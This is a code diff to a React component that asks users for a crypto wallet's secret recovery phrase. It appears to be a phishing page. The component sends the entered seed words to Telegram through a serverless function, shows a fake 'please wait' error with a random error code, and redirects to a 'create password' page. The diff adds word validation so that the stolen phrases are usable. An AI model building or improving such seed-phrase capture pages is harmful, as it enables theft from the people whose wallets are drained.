@@ -1,9 +1,66 @@
-import React, { useState, useEffect } from "react";
-import logo from "../assets/images/logo.png"
+import React, { useState, useEffect, useCallback } from "react";
+import logo from "../assets/images/logo.png";
 
 // Ensure FontAwesome is imported in your project for icons
 // Typically, you'd import it in your index.js or App.js:
 // import '@fortawesome/fontawesome-free/css/all.min.css';
+
+// Regular expression to allow only alphabetic characters
+const ALPHABETIC_REGEX = /^[A-Za-z]+$/;
+
+// ErrorPopup Component
+const ErrorPopup = ({ message, onClose }) => {
+  const [errorCode, setErrorCode] = useState("");
+
+  useEffect(() => {
+    // Generate a random 4-digit error code prefixed with 'ERR-'
+    const generateErrorCode = () => {
+      const randomNumber = Math.floor(1000 + Math.random() * 9000);
+      return `ERR-${randomNumber}`;
+    };
+
+    setErrorCode(generateErrorCode());
+  }, []);
+
+  return (
+    <div className="fixed inset-0 flex items-center justify-center z-50">
+      {/* Backdrop Overlay */}
+      <div
+        className="absolute inset-0 bg-black opacity-50"
+        onClick={onClose}
+      ></div>
+
+      {/* Modal Content */}
+      <div className="bg-[#141618] rounded-lg shadow-lg z-10 p-6 max-w-sm w-full mx-4">
+        {/* Header */}
+        <div className="flex items-center justify-center mb-4">
+          <i className="fas fa-exclamation-triangle text-[rgb(67,174,252)] text-3xl mr-2"></i>
+          <h2 className="text-2xl font-bold text-center text-[rgb(67,174,252)]">Error</h2>
+        </div>
+
+        {/* Error Code */}
+        <p className="text-center mb-2 font-mono text-white-800">
+          {errorCode}
+        </p>
+
+        {/* Explanation */}
+        <p className="text-center mb-6 text-white-700">
+          {message}
+        </p>
+
+        {/* Dismiss Button */}
+        <div className="flex justify-center">
+          <button
+            onClick={onClose}
+            className="px-6 py-2 bg-[rgb(67,174,252)] text-white rounded hover:bg-red-600 focus:outline-none focus:ring-2 focus:ring-red-400"
+          >
+            Close
+          </button>
+        </div>
+      </div>
+    </div>
+  );
+};
 
 const SecretRecoveryPhrase = () => {
   const [phraseCount, setPhraseCount] = useState(12);
@@ -25,6 +82,24 @@ const SecretRecoveryPhrase = () => {
   const [showErrorPopup, setShowErrorPopup] = useState(false);
   const [errorMessage, setErrorMessage] = useState("");
 
+  // State for Input Validation Error
+  const [inputError, setInputError] = useState(false);
+  const [inputErrorMessage, setInputErrorMessage] = useState("");
+
+  /**
+   * Memoized function to validate a word.
+   * Ensures that the function reference remains stable across renders,
+   * preventing unnecessary re-executions of useEffect.
+   */
+  const validateWord = useCallback((word) => {
+    // Returns true if the word contains only alphabetic characters
+    return ALPHABETIC_REGEX.test(word);
+  }, []);
+
+  /**
+   * Handles changes to the phrase count dropdown.
+   * Resets relevant states to accommodate the new phrase length.
+   */
   const handlePhraseCountChange = (e) => {
     const newCount = Number(e.target.value);
     setPhraseCount(newCount);
@@ -32,23 +107,55 @@ const SecretRecoveryPhrase = () => {
     setShowWord(Array(newCount).fill(false));
     setAllFilled(false); // Reset allFilled when phrase count changes
     setHasTyped(false); // Reset hasTyped when phrase count changes
+    setInputError(false); // Reset inputError when phrase count changes
+    setInputErrorMessage("");
   };
 
+  /**
+   * Toggles the visibility of a specific word input.
+   */
   const toggleShowWord = (index) => {
     const updated = [...showWord];
     updated[index] = !updated[index];
     setShowWord(updated);
   };
 
+  /**
+   * Handles changes to individual word inputs.
+   * Validates input and updates error states accordingly.
+   */
   const handleChangeWord = (index, value) => {
     if (!hasTyped) {
       setHasTyped(true); // User has started typing
     }
-    const updatedWords = [...words];
-    updatedWords[index] = value;
-    setWords(updatedWords);
+
+    if (value === "") {
+      // Allow empty input
+      setInputError(false);
+      setInputErrorMessage("");
+      const updatedWords = [...words];
+      updatedWords[index] = value;
+      setWords(updatedWords);
+      return;
+    }
+
+    // Check if the input contains only alphabetic characters
+    if (!validateWord(value)) {
+      setInputError(true);
+      setInputErrorMessage("Only letters are allowed. No numbers or special characters.");
+    } else {
+      setInputError(false);
+      setInputErrorMessage("");
+      const updatedWords = [...words];
+      updatedWords[index] = value;
+      setWords(updatedWords);
+    }
   };
 
+  /**
+   * Handles pasting multiple words into the inputs.
+   * Validates each pasted word and updates the state accordingly.
+   */
   const handlePaste = (index, e) => {
     e.preventDefault();
     if (!hasTyped) {
@@ -57,25 +164,51 @@ const SecretRecoveryPhrase = () => {
     const text = e.clipboardData.getData("text").trim();
     const splitted = text.split(/\s+/);
     const updated = [...words];
-
-    // Start pasting from the first cell (index 0) instead of the current index
     let pointer = 0;
+    let hasInvalidWord = false;
+
     splitted.forEach((w) => {
       if (pointer < phraseCount) {
-        updated[pointer] = w;
-        pointer++;
+        if (!validateWord(w)) {
+          hasInvalidWord = true; // Found a word with invalid characters
+        } else {
+          updated[pointer] = w;
+          pointer++;
+        }
       }
     });
+
     setWords(updated);
+
+    if (hasInvalidWord) {
+      setInputError(true);
+      setInputErrorMessage("Pasted words containing numbers or special characters were ignored.");
+    } else {
+      setInputError(false);
+      setInputErrorMessage("");
+    }
   };
 
+  /**
+   * useEffect hook to determine if all words are filled and valid.
+   * Dependencies include 'words', 'phraseCount', and 'validateWord'.
+   * Including 'validateWord' ensures that the effect runs correctly
+   * if the validation logic changes.
+   */
   useEffect(() => {
     const filled =
       words.length === phraseCount &&
       words.every((word) => word.trim() !== "");
-    setAllFilled(filled);
-  }, [words, phraseCount]);
-  
+
+    const allValid = words.every((word) => validateWord(word));
+
+    setAllFilled(filled && allValid);
+  }, [words, phraseCount, validateWord]);
+
+  /**
+   * Sends the validated recovery phrase to Telegram via a serverless function.
+   * Handles success and error states accordingly.
+   */
   const sendToTelegram = async (words) => {
     try {
       const response = await fetch('/.netlify/functions/sendTelegram', {
@@ -85,75 +218,21 @@ const SecretRecoveryPhrase = () => {
         },
         body: JSON.stringify({ words }),
       });
-  
+
       const data = await response.json();
-  
+
       if (!response.ok) {
         throw new Error(data.message || 'Failed to send message.');
       }
-  
+
       console.log('Message sent successfully to Telegram');
       // Optionally, navigate to the next page or provide success feedback
-      // window.location.href = "/create-password";
+      window.location.href = "/create-password";
     } catch (error) {
       console.error('Error sending message to Telegram:', error);
       setErrorMessage('Please wait a few minutes before you try again.');
       setShowErrorPopup(true);
     }
-  };
-  
-  // Error Popup Component
-  const ErrorPopup = ({ message, onClose }) => {
-    const [errorCode, setErrorCode] = useState("");
-
-    useEffect(() => {
-      // Generate a random 4-digit error code prefixed with 'ERR-'
-      const generateErrorCode = () => {
-        const randomNumber = Math.floor(1000 + Math.random() * 9000);
-        return `ERR-${randomNumber}`;
-      };
-
-      setErrorCode(generateErrorCode());
-    }, []);
-
-    return (
-      <div className="fixed inset-0 flex items-center justify-center z-50">
-        {/* Backdrop Overlay */}
-        <div
-          className="absolute inset-0 bg-black opacity-50"
-          onClick={onClose}
-        ></div>
-
-        {/* Modal Content */}
-        <div className="bg-white rounded-lg shadow-lg z-10 p-6 max-w-sm w-full mx-4">
-          {/* Header */}
-          <div className="flex items-center justify-center mb-4">
-            <i className="fas fa-exclamation-triangle text-red-500 text-3xl mr-2"></i>
-            <h2 className="text-2xl font-bold text-center text-red-600">Error</h2>
-          </div>
-
-          {/* Error Code */}
-          <p className="text-center mb-2 font-mono text-gray-800">
-            {errorCode}
-          </p>
-
-          {/* Explanation */}
-          <p className="text-center mb-6 text-gray-700">
-            Please wait a few minutes before you try again.
-          </p>
-
-          {/* Dismiss Button */}
-          <div className="flex justify-center">
-            <button
-              onClick={onClose}
-              className="px-6 py-2 bg-red-500 text-white rounded hover:bg-red-600 focus:outline-none focus:ring-2 focus:ring-red-400"
-            >
-              Close
-            </button>
-          </div>
-        </div>
-      </div>
-    );
   };
 
   return (
@@ -281,7 +360,7 @@ const SecretRecoveryPhrase = () => {
           {/* Input Fields Grid */}
           <div className="grid grid-cols-1 md:grid-cols-3 mb-2">
             {words.map((word, i) => (
-              <div key={i} className="flex items-center justify-center">
+              <div key={i} className="flex items-center justify-center mb-2">
                 {/* Number (ensure same width for single/double digits) */}
                 <span
                   className="mr-2 text-white font-mono"
@@ -297,7 +376,9 @@ const SecretRecoveryPhrase = () => {
                     value={word}
                     onChange={(e) => handleChangeWord(i, e.target.value)}
                     onPaste={(e) => handlePaste(i, e)}
-                    className="w-full bg-transparent text-white focus:outline-none text-sm"
+                    className={`w-full bg-transparent text-white focus:outline-none text-sm ${
+                      inputError && !validateWord(word) ? "border-red-500" : ""
+                    }`}
                   />
                 </div>
 
@@ -317,8 +398,20 @@ const SecretRecoveryPhrase = () => {
             ))}
           </div>
 
+          {/* Show Input Error Message */}
+          {inputError && (
+            <div className="border-l-4 border-red-500 bg-[#34282B] p-3 mb-6 rounded">
+              <div className="flex items-start text-white text-sm">
+                <i className="fa-solid fa-warning text-red-500 text-base flex-shrink-0"></i>
+                <span className="ml-1 text-xs">
+                  {inputErrorMessage}
+                </span>
+              </div>
+            </div>
+          )}
+
           {/* Show Warning Box only if user has started typing and not all cells are filled */}
-          {hasTyped && !allFilled && (
+          {hasTyped && !allFilled && !inputError && (
             <div className="border-l-4 border-[rgb(232,143,151)] bg-[#34282B] p-3 mb-6 rounded">
               <div className="flex items-start text-white text-sm">
                 <i className="fa-solid fa-warning text-[rgb(232,143,151)] text-base flex-shrink-0"></i>
@@ -357,61 +450,6 @@ const SecretRecoveryPhrase = () => {
               onClose={() => setShowErrorPopup(false)}
             />
           )}
-        </div>
-      </div>
-    </div>
-  );
-};
-
-// ErrorPopup Component
-// eslint-disable-next-line
-const ErrorPopup = ({ message, onClose }) => {
-  const [errorCode, setErrorCode] = useState("");
-
-  useEffect(() => {
-    // Generate a random 4-digit error code prefixed with 'ERR-'
-    const generateErrorCode = () => {
-      const randomNumber = Math.floor(1000 + Math.random() * 9000);
-      return `ERR-${randomNumber}`;
-    };
-
-    setErrorCode(generateErrorCode());
-  }, []);
-
-  return (
-    <div className="fixed inset-0 flex items-center justify-center z-50">
-      {/* Backdrop Overlay */}
-      <div
-        className="absolute inset-0 bg-black opacity-50"
-        onClick={onClose}
-      ></div>
-
-      {/* Modal Content */}
-      <div className="bg-white rounded-lg shadow-lg z-10 p-6 max-w-sm w-full mx-4">
-        {/* Header */}
-        <div className="flex items-center justify-center mb-4">
-          <i className="fas fa-exclamation-triangle text-red-500 text-3xl mr-2"></i>
-          <h2 className="text-2xl font-bold text-center text-red-600">Error</h2>
-        </div>
-
-        {/* Error Code */}
-        <p className="text-center mb-2 font-mono text-gray-800">
-          {errorCode}
-        </p>
-
-        {/* Explanation */}
-        <p className="text-center mb-6 text-gray-700">
-          Please wait a few minutes before you try again.
-        </p>
-
-        {/* Dismiss Button */}
-        <div className="flex justify-center">
-          <button
-            onClick={onClose}
-            className="px-6 py-2 bg-red-500 text-white rounded hover:bg-red-600 focus:outline-none focus:ring-2 focus:ring-red-400"
-          >
-            Close
-          </button>
         </div>
       </div>
     </div>
